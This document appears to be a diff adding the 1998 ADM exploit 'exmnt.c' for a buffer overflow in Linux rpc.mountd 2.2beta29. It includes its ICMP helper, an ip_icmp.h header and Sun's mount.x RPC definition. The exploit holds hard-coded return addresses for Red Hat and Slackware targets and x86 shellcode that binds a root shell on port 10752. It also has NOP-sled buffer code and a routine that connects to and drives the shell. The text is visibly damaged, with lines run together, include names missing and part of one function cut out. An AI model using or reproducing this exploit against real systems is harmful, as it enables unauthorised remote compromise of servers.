@@ -1,0 +1,198 @@
+---------------- exmnt.c ---------------- /* * Linux rpc.mountd 2.2beta29 
+exploit * * Coded by plaguez, Antilove, Mikasoft at the ADM Party (7/98) * * 
+Credits: * - DiGiT for finding the vulnerability * Compile: rpcgen mount.x ; gcc 
+exmnt.c */ #include #include #include #include #include #include #include 
+#include #include #include #include #include #include #include #include 
+"mount_clnt.c" #include "mount_xdr.c" #include "ADMgetip.c" #define NOP 0x90 
+#define WAITPORT 10752 #define STKLEN 200 char buff[10000]; struct target { char 
+desc[80]; int systype; unsigned long addr; int addalign; }; struct target 
+targets[] = { {"RedHat Linux 5.1 k 2.0.35 rpc.mountd", 0, 0x08052d28, 0}, 
+{"Slakware 3.3 k 2.0.33+Solar_Designer's patch rpc.mountd 2.2beta29", 0, 
+0x0805bbe0, 0}, }; char c0de[] = "\x33\xDB\x33\xC0\xB0\x1B\xCD\x80" /* alarm(0); 
+*/ "\x33\xD2\x33\xc0\x8b\xDA\xb0\x06\xcd\x80\xfe\xc2\x75\xf4" /* close FDs */ 
+"\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x62\xeb\x62" /* w/ fork() */ 
+//"\x31\xc0\xb0\x02\x90\x90\x85\xc0\x90\x90\xeb\x62" /* w/o fork() */ 
+"\x5e\x56\xac\x3c\xfd\x74\x06\xfe\xc0\x74\x0b" /* =\_ who wrote it? */ 
+"\xeb\xf5\xb0\x30\xfe\xc8\x88\x46\xff\xeb\xec" /* =/` hmm? */ 
+"\x5e\xb0\x02\x89\x06\xfe\xc8\x89\x46\x04\xb0\x06\x89\x46\x08\xb0\x66\x31\xdb" 
+"\xfe\xc3\x89\xf1\xcd\x80\x89\x06\xb0\x02\x66\x89\x46\x0c\xb0\x2a\x66\x89\x46" 
+"\x0e\x8d\x46\x0c\x89\x46\x04\x31\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0" 
+"\x66\xfe\xc3\xcd\x80\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04\xcd\x80\xeb\x04" 
+"\xeb\x4c\xeb\x52\x31\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\xfe\xc3\xcd\x80" 
+"\x88\xc3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xfe\xc1\xcd\x80\xb0\x3f\xfe\xc1" 
+"\xcd\x80\xb8\x2e\x62\x69\x6e\x40\x89\x06\xb8\x2e\x73\x68\x21\x40\x89\x46" 
+"\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e" 
+"\x08\x8d\x56\x0c\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x45\xff\xff" 
+"\xff\xFF\xFD\xFF\x50\x72\x69\x76\x65\x74\x20\x41\x44\x4D\x63\x72\x65\x77"; void 
+handle_alarm (sn) int sn; { alarm (0); signal (SIGALRM, SIG_DFL); printf 
+("Unable to connect: Connection timed out\n"); exit (0); } unsigned long host2ip 
+(char *serv) { struct sockaddr_in sinn; struct hostent *hent; hent = 
+gethostbyname (serv); if (hent == NULL) return 0; bzero ((char *) &sinn, sizeof 
+(sinn)); memcpy ((char *) &sinn.sin_addr, hent->h_addr, hent->h_length); return 
+sinn.sin_addr.s_addr; } void addchar (char *str, char ch) { unsigned int len; 
+len = strlen (str); str[len] = ch; str[len + 1] = 0; } int ConnectServer (char 
+*host, int port) { int sockdesc; struct sockaddr_in sin; struct hostent *he; 
+sin.sin_port = htons (port); sin.sin_family = AF_INET; he = gethostbyname 
+(host); if (he) { memcpy ((caddr_t) & sin.sin_addr.s_addr, he->h_addr, 
+he->h_length); } else { printf ("Error: gethostbyname(): Unable to resolve 
+[%s]\n", host); exit (-1); } if ((sockdesc = socket (AF_INET, SOCK_STREAM, 0)) < 
+0) { perror ("Error: socket()"); exit (-1); } if (connect (sockdesc, (struct 
+sockaddr *) &sin, sizeof (sin)) < 0) { perror ("Error: connect()"); exit (-1); } 
+return sockdesc; } void MultiplexConnection (int sockdesc) { int ret; char 
+sockbuf[2048]; fd_set readfds; sprintf (sockbuf, "trap '' SIGALRM SIGTRAP\n\ 
+PATH=/usr/local/bin:/bin:/usr/bin:/sbin:/usr/sbin;export PATH\n\ 
+/usr/sbin/rpc.mountd sin_family = AF_INET; ra->sin_port = htons (rp); if 
+((ra->sin_addr.s_addr = inet_addr (hn)) == -1) { struct hostent *he; if ((he = 
+gethostbyname (hn)) != (struct hostent *) NULL) { memcpy (&ra->sin_addr.s_addr, 
+he->h_addr, 4); return 1; } else herror ("Unable to resolve hostname"); } else 
+return 1; return 0; } int m00unt (char *host, char *buf) { CLIENT *client; 
+fhstatus *FH; dirpath DIR; char buffer[10000]; int i; char c; /* ini the stuff 
+*/ /* mika is fuqn bad @ mace heheheh I OWN HIM %!@$!@$!@ :) */ bzero (buffer, 
+sizeof (buffer)); DIR = buffer; /* create the socket */ if ((client = 
+clnt_create (host, MOUNTPROG, MOUNTVERS, "udp")) == NULL) { printf ("rpc.mountd 
+not registred :>\n"); exit (2); } strncpy (DIR, buf, sizeof (buffer)); if 
+((mountproc_mnt_1 (&DIR, client)) == -1) { printf ("mountproc_mnt failed :<\n"); 
+exit (0); } } void attack_mountd (loc) char *loc; { int sockdesc; int status; 
+switch (fork ()) { case 0: m00unt (loc, buff); printf ("@#$%#!#$$\n"); exit (1); 
+case -1: printf ("fork error\n"); exit (1); default: printf ("Attente 
+connexion...\n"); fflush (stdout); wait (&status); } sleep (5); sockdesc = 
+ConnectServer (loc, WAITPORT); printf ("Shell found!\n"); MultiplexConnection 
+(sockdesc); close (sockdesc); exit (-1); } void usage (char *pname) { int compt; 
+printf ("\nUsage:\t%s targethost [-t type] [-o offset] [-a align]\n", pname); 
+printf ("\ttargethost may either be name or ip.\n"); printf ("\ttype chooses 
+from a list of predefined targets.\n"); for (compt = 0; compt < sizeof (targets) 
+/ (sizeof (struct target)); compt++) printf ("\t\t%i: %s\n", compt, 
+targets[compt].desc); printf ("\toffset is the offset (not required if -t is 
+used)\n"); printf ("\talign is the alignment (not required if -t is used)\n\n"); 
+} int host2a (unsigned long ipz) { struct in_addr muf; muf.s_addr = ipz; return 
+((103 - (strlen (inet_ntoa (muf)))) % 4); } void main (argc, argv) int argc; 
+char *argv[]; { int i; struct sockaddr_in ra; struct in_addr blah; unsigned long 
+muf; char *ptr; char *endbuff; char *target = NULL; unsigned long addr; unsigned 
+char jmp; long *l_ptr; int offset = 0; int bsize = 1024; int align = -1; int 
+targ = 0; char o; char *argv0 = strdup (argv[0]); while ((o = getopt (argc, 
+argv, "a:o:t:h")) != -1) switch (o) { case 'h': usage (argv0); exit (1); case 
+'o': if (optarg) offset -= atoi (optarg); break; case 't': if (optarg) targ = 
+atoi (optarg); break; case 'a': if (optarg) align = atoi(optarg); break; } argc 
+-= optind; argv += optind; target = *argv; if (!target) { usage (argv0); exit 
+(1); } memset (buff, '\x90', bsize); printf ("selected target (-t %d): %s.\n", 
+targ, targets[targ].desc); addr = targets[targ].addr; printf ("shellcode lenght: 
+%i\n", strlen(c0de)); printf ("buffer size: %i\n", bsize); addr += offset; 
+printf ("offset: %d\n", offset); printf ("address: 0x%lx\n", addr); getlocalip 
+(&muf, host2ip (target)); blah.s_addr = muf; printf ("local ip = %s\n", 
+inet_ntoa (blah)); if (align < 0) align = host2a (muf); printf ("align = %i\n", 
+align); align += targets[targ].addalign; endbuff = buff + bsize; for (ptr = 
+buff; ptr < (endbuff - strlen(c0de) - STKLEN); ptr++) *ptr = NOP; for (i = 0; i 
+< strlen(c0de); i++) *(ptr++) = c0de[i]; for (ptr += align; ptr < endbuff; ptr 
++= 4) { ptr[0] = (addr & 0x000000ff); ptr[1] = (addr & 0x0000ff00) >> 8; ptr[2] 
+= (addr & 0x00ff0000) >> 16; ptr[3] = (addr & 0xff000000) >> 24; } *endbuff = 
+'\x0'; attack_mountd (target); } /* today 9 Aug 1998 */ ---------------- 
+ADMgetip.c ---------------- #include #include #include #include #include 
+#include "ip_icmp.h" #define ICMP_REPLY_TIMEOUT 15 unsigned short in_cksum 
+(addr, len) u_short *addr; int len; { register int nleft = len; register u_short 
+*w = addr; register int sum = 0; u_short answer = 0; /* * Our algorithm is 
+simple, using a 32 bit accumulator (sum), we add * sequential 16 bit words to 
+it, and at the end, fold back all the * carry bits from the top 16 bits into the 
+lower 16 bits. */ while (nleft > 1) { sum += *w++; nleft -= 2; } /* mop up an 
+odd byte, if necessary */ if (nleft == 1) { *(u_char *) (&answer) = *(u_char *) 
+w; sum += answer; } /* add back carry outs from top 16 bits to low 16 bits */ 
+sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */ sum += (sum >> 
+16); /* add carry */ answer = ~sum; /* truncate to 16 bits */ return (answer); } 
+int getlocalip(unsigned long* src,unsigned long dest) { char try = 0; struct 
+sockaddr_in sin; int icmp_sock; int paket_len,sin_len; char paket[1024]; short* 
+chk; struct timeval tm,tm1,tm2; long sec,usec; float ms; fd_set fdset; struct 
+icmphdr* icmp=(struct icmphdr*)paket; kkk: icmp_sock=socket(AF_INET, SOCK_RAW, 
+IPPROTO_ICMP); FD_ZERO(&fdset); FD_SET(icmp_sock,&fdset); 
+tm.tv_sec=ICMP_REPLY_TIMEOUT;; tm.tv_usec=0; sin.sin_family=AF_INET; 
+sin.sin_port=htons(0); sin.sin_addr.s_addr=dest; paket_len=8; icmp->type=8; 
+icmp->code=0; icmp->checksum=0; icmp->un.echo.id=59; icmp->un.echo.sequence=0; 
+icmp->checksum=in_cksum(icmp,paket_len); sin_len=sizeof(sin); 
+sendto(icmp_sock,&paket,paket_len,0,(struct sockaddr *)&sin,sin_len); 
+gettimeofday(&tm1,NULL); if (select(icmp_sock+1,&fdset,NULL,NULL,&tm)==1) { 
+recvfrom(icmp_sock,&paket,sizeof(paket),0,(struct sockaddr *)&sin,&sin_len); 
+gettimeofday(&tm2,NULL); sec=tm2.tv_sec-tm1.tv_sec; 
+usec=tm2.tv_usec-tm1.tv_usec; ms=(sec*1000)+((float)usec/1000); printf("ping: 
+%9.2fms\n",ms); } else { printf("ping timeout\n"); try ++; if ( try > 2 
+)return(-1); close (icmp_sock); goto kkk; } *src=sin.sin_addr.s_addr; return 0; 
+} --------------- ip_icmp.h --------------- struct icmphdr { u_int8_t type; /* 
+message type */ u_int8_t code; /* type sub-code */ u_int16_t checksum; union { 
+struct { u_int16_t id; u_int16_t sequence; } echo; /* echo datagram */ u_int32_t 
+gateway; /* gateway address */ struct { u_int16_t __unused; u_int16_t mtu; } 
+frag; /* path mtu discovery */ } un; }; #define ICMP_ECHOREPLY 0 /* Echo Reply 
+*/ #define ICMP_DEST_UNREACH 3 /* Destination Unreachable */ #define 
+ICMP_SOURCE_QUENCH 4 /* Source Quench */ #define ICMP_REDIRECT 5 /* Redirect 
+(change route) */ #define ICMP_ECHO 8 /* Echo Request */ #define 
+ICMP_TIME_EXCEEDED 11 /* Time Exceeded */ #define ICMP_PARAMETERPROB 12 /* 
+Parameter Problem */ #define ICMP_TIMESTAMP 13 /* Timestamp Request */ #define 
+ICMP_TIMESTAMPREPLY 14 /* Timestamp Reply */ #define ICMP_INFO_REQUEST 15 /* 
+Information Request */ #define ICMP_INFO_REPLY 16 /* Information Reply */ 
+#define ICMP_ADDRESS 17 /* Address Mask Request */ #define ICMP_ADDRESSREPLY 18 
+/* Address Mask Reply */ #define NR_ICMP_TYPES 18 /* Codes for UNREACH. */ 
+#define ICMP_NET_UNREACH 0 /* Network Unreachable */ #define ICMP_HOST_UNREACH 1 
+/* Host Unreachable */ #define ICMP_PROT_UNREACH 2 /* Protocol Unreachable */ 
+#define ICMP_PORT_UNREACH 3 /* Port Unreachable */ #define ICMP_FRAG_NEEDED 4 /* 
+Fragmentation Needed/DF set */ #define ICMP_SR_FAILED 5 /* Source Route failed 
+*/ #define ICMP_NET_UNKNOWN 6 #define ICMP_HOST_UNKNOWN 7 #define 
+ICMP_HOST_ISOLATED 8 #define ICMP_NET_ANO 9 #define ICMP_HOST_ANO 10 #define 
+ICMP_NET_UNR_TOS 11 #define ICMP_HOST_UNR_TOS 12 #define ICMP_PKT_FILTERED 13 /* 
+Packet filtered */ #define ICMP_PREC_VIOLATION 14 /* Precedence violation */ 
+#define ICMP_PREC_CUTOFF 15 /* Precedence cut off */ #define NR_ICMP_UNREACH 15 
+/* instead of hardcoding immediate value */ /* Codes for REDIRECT. */ #define 
+ICMP_REDIR_NET 0 /* Redirect Net */ #define ICMP_REDIR_HOST 1 /* Redirect Host 
+*/ #define ICMP_REDIR_NETTOS 2 /* Redirect Net for TOS */ #define 
+ICMP_REDIR_HOSTTOS 3 /* Redirect Host for TOS */ /* Codes for TIME_EXCEEDED. */ 
+#define ICMP_EXC_TTL 0 /* TTL count exceeded */ #define ICMP_EXC_FRAGTIME 1 /* 
+Fragment Reass time exceeded */ ------------ mount.x ------------ /* @(#)mount.x 
+2.1 88/08/01 4.0 RPCSRC */ /* @(#)mount.x 1.2 87/09/18 Copyr 1987 Sun Micro */ 
+/* * Sun RPC is a product of Sun Microsystems, Inc. and is provided for * 
+unrestricted use provided that this legend is included on all tape * media and 
+as a part of the software program in whole or part. Users * may copy or modify 
+Sun RPC without charge, but are not authorized * to license or distribute it to 
+anyone else except as part of a product or * program developed by the user. * * 
+SUN RPC IS PROVIDED AS IS WITH NO WARRANTIES OF ANY KIND INCLUDING THE * 
+WARRANTIES OF DESIGN, MERCHANTIBILITY AND FITNESS FOR A PARTICULAR * PURPOSE, OR 
+ARISING FROM A COURSE OF DEALING, USAGE OR TRADE PRACTICE. * * Sun RPC is 
+provided with no support and without any obligation on the * part of Sun 
+Microsystems, Inc. to assist in its use, correction, * modification or 
+enhancement. * * SUN MICROSYSTEMS, INC. SHALL HAVE NO LIABILITY WITH RESPECT TO 
+THE * INFRINGEMENT OF COPYRIGHTS, TRADE SECRETS OR ANY PATENTS BY SUN RPC * OR 
+ANY PART THEREOF. * * In no event will Sun Microsystems, Inc. be liable for any 
+lost revenue * or profits or other special, indirect and consequential damages, 
+even if * Sun has been advised of the possibility of such damages. * * Sun 
+Microsystems, Inc. * 2550 Garcia Avenue * Mountain View, California 94043 */ /* 
+* Protocol description for the mount program */ const MNTPATHLEN = 1024; /* 
+maximum bytes in a pathname argument */ const MNTNAMLEN = 255; /* maximum bytes 
+in a name argument */ const FHSIZE = 32; /* size in bytes of a file handle */ /* 
+* The fhandle is the file handle that the server passes to the client. * All 
+file operations are done using the file handles to refer to a file * or a 
+directory. The file handle can contain whatever information the * server needs 
+to distinguish an individual file. */ typedef opaque fhandle[FHSIZE]; /* * If a 
+status of zero is returned, the call completed successfully, and * a file handle 
+for the directory follows. A non-zero status indicates * some sort of error. The 
+status corresponds with UNIX error numbers. */ union fhstatus switch (unsigned 
+fhs_status) { case 0: fhandle fhs_fhandle; default: void; }; /* * The type 
+dirpath is the pathname of a directory */ typedef string dirpath; /* * The type 
+name is used for arbitrary names (hostnames, groupnames) */ typedef string name; 
+/* * A list of who has what mounted */ typedef struct mountbody *mountlist; 
+struct mountbody { name ml_hostname; dirpath ml_directory; mountlist ml_next; }; 
+/* * A list of netgroups */ typedef struct groupnode *groups; struct groupnode { 
+name gr_name; groups gr_next; }; /* * A list of what is exported and to whom */ 
+typedef struct exportnode *exports; struct exportnode { dirpath ex_dir; groups 
+ex_groups; exports ex_next; }; program MOUNTPROG { /* * Version one of the mount 
+protocol communicates with version two * of the NFS protocol. The only 
+connecting point is the fhandle * structure, which is the same for both 
+protocols. */ version MOUNTVERS { /* * Does no work. It is made available in all 
+RPC services * to allow server reponse testing and timing */ void 
+MOUNTPROC_NULL(void) = 0; /* * If fhs_status is 0, then fhs_fhandle contains the 
+* file handle for the directory. This file handle may * be used in the NFS 
+protocol. This procedure also adds * a new entry to the mount list for this 
+client mounting * the directory. * Unix authentication required. */ fhstatus 
+MOUNTPROC_MNT(dirpath) = 1; /* * Returns the list of remotely mounted 
+filesystems. The * mountlist contains one entry for each hostname and * 
+directory pair. */ mountlist MOUNTPROC_DUMP(void) = 2; /* * Removes the mount 
+list entry for the directory * Unix authentication required. */ void 
+MOUNTPROC_UMNT(dirpath) = 3; /* * Removes all of the mount list entries for this 
+client * Unix authentication required. */ void MOUNTPROC_UMNTALL(void) = 4; /* * 
+Returns a list of all the exported filesystems, and which * machines are allowed 
+to import it. */ exports MOUNTPROC_EXPORT(void) = 5; /* * Identical to 
+MOUNTPROC_EXPORT above */ exports MOUNTPROC_EXPORTALL(void) = 6; } = 1; } = 
+100005; 
